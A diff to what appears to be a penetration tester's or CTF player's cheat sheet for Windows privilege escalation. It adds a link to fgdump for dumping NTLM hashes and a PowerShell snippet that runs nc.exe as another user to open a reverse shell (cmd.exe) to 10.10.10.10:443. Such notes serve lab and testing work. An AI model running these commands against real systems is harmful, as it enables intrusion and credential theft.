@@ -17,7 +17,8 @@ whoami /all
 systeminfo  
 
 [WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)  
-[Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)  
+[Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1) 
+[fgdump.exe](https://github.com/interference-security/kali-windows-binaries/tree/master/fgdump)  /// DumpPassword NTLM Hashes  
 
 File Transfer:
 --------------------------------------------------
@@ -47,6 +48,14 @@ readreadelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
 Create pattern: /opt/metasploit-framework/tools/exploit/pattern_create.rb -l 100  
 Pattern Offset: /opt/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x0000000  
 
+
+PSChangeUser  
+----------------------------------------------------
+$username = 'alice'  
+$password = 'alicepass'  
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force  
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword  
+Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nv","10.10.10.10","443","-e","cmd.exe") -WorkingDirectory C:\Users\Public  
 
 Hashes decrypt:
 --------------------------------------------------
